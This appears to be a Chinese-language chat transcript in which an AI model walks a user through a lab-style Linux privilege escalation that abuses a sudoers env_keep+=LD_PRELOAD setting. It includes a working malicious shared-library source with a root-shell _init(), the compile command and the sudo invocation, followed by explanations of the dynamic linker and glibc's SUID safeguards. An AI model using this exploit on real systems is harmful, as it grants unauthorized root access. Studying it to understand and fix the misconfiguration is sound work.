### 原理

`LD_PRELOAD` 是个环境变量，告诉动态链接器在加载任何程序之前**优先加载指定的 .so 文件**。如果 sudo 允许保留这个变量，就可以注入恶意代码以 root 权限执行。

---

### 逐步拆解

**1. 发现漏洞条件**

```
env_keep+=LD_PRELOAD   ← sudo 配置保留了这个变量
NOPASSWD: /usr/sbin/apache2  ← 可以 sudo 跑 apache2
```

两个条件缺一不可。

**2. 写恶意 .so**

c

```c
// shell.c 大概长这样
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

`_init()` 是 .so 加载时自动执行的函数。

**3. 编译成共享库**

bash

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

- `-fPIC` — 位置无关代码，.so 必须
- `-shared` — 输出共享库
- `-nostartfiles` — 不链接标准启动文件，避免冲突

**4. 触发提权**

bash

```bash
# 第一次失败：相对路径被拒绝
sudo LD_PRELOAD=shell.so apache2  → ERROR

# 第二次成功：绝对路径
sudo LD_PRELOAD=/home/user/shell.so apache2
```

apache2 以 root 启动前先加载 shell.so，`_init()` 执行，直接弹出 root shell。

**结果：`root@debian`** ✓

---

### 关键点

|条件|说明|
|---|---|
|`env_keep+=LD_PRELOAD`|sudoers 配置错误，正常应该去掉|
|有任意 sudo NOPASSWD 命令|用哪个命令触发都行|
|必须用绝对路径|ld.so 会拒绝相对路径|

这个手法在 GTFOBins 上也有收录，是经典 sudo 错误配置之一。





## You said: 这个变量是sudo的吗，不是那些可以用sudo执行的程序吗

这个变量是sudo的吗，不是那些可以用sudo执行的程序吗

5:42 PM





## Claude responded: 好问题。LD_PRELOAD 本身是动态链接器的变量，不是 sudo 专属的。

好问题。`LD_PRELOAD` 本身是**动态链接器**的变量，不是 sudo 专属的。

---

### 正常情况

出于安全考虑，`LD_PRELOAD` 对 **SUID 程序**和 **sudo** 默认是**失效的**——动态链接器检测到权限提升就会忽略它，否则早就是大漏洞了。

---

### 这里为什么能用

关键在 sudoers 里这行配置：

```
env_keep+=LD_PRELOAD
```

这是管理员**手动配置**让 sudo 把 `LD_PRELOAD` 这个变量**带入 sudo 执行的环境里**。

所以流程是：

```
你设置 LD_PRELOAD
    ↓
sudo 执行 apache2（本来会清空环境变量）
    ↓
但 env_keep 说"保留 LD_PRELOAD"
    ↓
apache2 以 root 身份启动，动态链接器看到 LD_PRELOAD
    ↓
先加载 shell.so → _init() 以 root 运行
```

---

### 总结

- `LD_PRELOAD` 是链接器的变量，作用于**被执行的那个程序**（apache2）
- sudo 默认会清空环境变量，`env_keep` 是个错误配置，人为打了个洞
- 所以本质是 **sudoers 配置失误**，不是 sudo 本身的漏洞





## You said: 如果没有sudo,这个LD变量还能执行吗

如果没有sudo,这个LD变量还能执行吗

5:44 PM





## Claude responded: 可以执行，但提不了权。

可以执行，但**提不了权**。

---

### 没有 sudo 的情况

bash

```bash
LD_PRELOAD=/home/user/shell.so apache2
```

这完全合法，动态链接器会正常加载 shell.so，`_init()` 也会执行——但整个过程以**你自己的权限**运行，得到的 shell 还是你自己，没有意义。

---

### 为什么 SUID 也不行

你可能想到，apache2 如果是 SUID 程序呢？

bash

```bash
# 对 SUID 程序，动态链接器会主动忽略 LD_PRELOAD
LD_PRELOAD=shell.so 某个suid程序  → 变量被忽略
```

这是 glibc 的安全机制：检测到**实际 UID ≠ 有效 UID**（即 SUID 生效时），直接丢弃 `LD_PRELOAD`，就是专门防这种攻击的。

---

### 所以这个漏洞的本质

```
LD_PRELOAD 能提权  =  有办法让高权限进程加载你的 .so
                              ↑
                    sudo + env_keep 恰好满足了这个条件
```